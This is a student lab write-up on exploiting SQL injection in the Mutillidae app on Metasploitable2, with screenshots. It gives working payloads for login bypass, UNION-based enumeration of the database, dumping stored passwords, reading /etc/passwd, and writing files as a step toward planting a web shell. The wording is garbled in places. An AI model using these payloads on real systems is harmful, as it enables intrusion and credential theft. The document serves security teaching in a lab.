# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![eth8 1](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/6fa42203-c672-41c8-a7e7-7807994871bd)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![eth8 2](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/9aa298ce-6403-4a51-af3f-90b716aa7a92)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![eth8 3](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/212ce585-d2cf-452c-a7e0-1201249b7ec0)

Click on the link “Please register here :

![eth8 4](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/531217ec-93c6-49ea-b932-3878e4f85946)

Click on “Create Account” to display the following page:

![eth8 5](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/bc28f215-4ea2-43df-9265-1e593e9cf9a3)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![eth8 6](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/aecf82af-418e-4d2f-84e3-b777cb8f3748)

Click “Login”. The logged in page will show as below:

![eth8 7](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/6dd176e3-d599-4d6d-ad05-d129f4d22bc2)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![eth8 8](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/d2dc4111-12be-4aeb-bc11-a8d127916e5c)

Click the login button and you will see it enter into the administrator page.

![eth8 9](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/d572f1de-3d66-46a2-a561-b3864a8da010)

Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:

![eth8 10](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/1622eef8-6495-4aef-a74b-8a4eb07c6fab)

![eth8 11](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/d3b6cebf-7bd3-46d9-9f2b-d3e2693e97ba)

![eth8 12](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/ad074c7a-9b3c-4b5e-82cd-735893673e09)

![eth8 13](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/b4219cb2-f318-48ad-ba64-698d700c9dfe)

![eth8 14](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/28077b4c-6c91-48d5-a294-aee83f4941ad)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![eth8 15](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/0db63d81-8fee-495d-9f49-bc6491235892)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![eth8 16](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/ac60ebd8-853d-4886-86e6-6f455b53f9e3)

After adding the order by 6 into the existing url , the following error statement will be obtained:

![eth8 17](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/fcccc049-873f-4e3b-b640-92d95ba3c4bb)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![eth8 18](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/4f806392-1287-412f-a2d1-49cd91e48dd4)

As it is having 5 columns the query worked fine and it provides the correct result :

![eth8 19](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/6bf05e38-bd1f-4eb7-9f49-669f13dc159c)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5) :

![eth8 20](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/cbdbeaa0-73bf-4f30-b4bd-f3f1f744ffd9)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![eth8 21](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/4de3388b-b36d-4a12-8784-5df4bc9995db)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![eth8 22](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/903eeb0d-ea41-4b28-8576-899080fc1b86)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![eth8 23](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/cdcb1775-bfbe-4077-a462-08dd2ddf7eb4)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![eth8 24](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/a93713a6-e261-4979-8eb1-b6339b397f4a)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![eth8 25](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/3bc51835-94e8-4028-b04d-07a7752897c6)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![eth8 26](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/06af676f-0174-4564-9ac6-09e269ee2730)

Reading and writing files on the web-server We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![eth8 27](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/61d3b8b7-87d8-4598-96d0-eb4100cdbf09)

![eth8 28](https://github.com/Gayathriraj18/sqlinjection/assets/94154854/1d276e48-b1b3-431e-8d65-725170600cd8)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
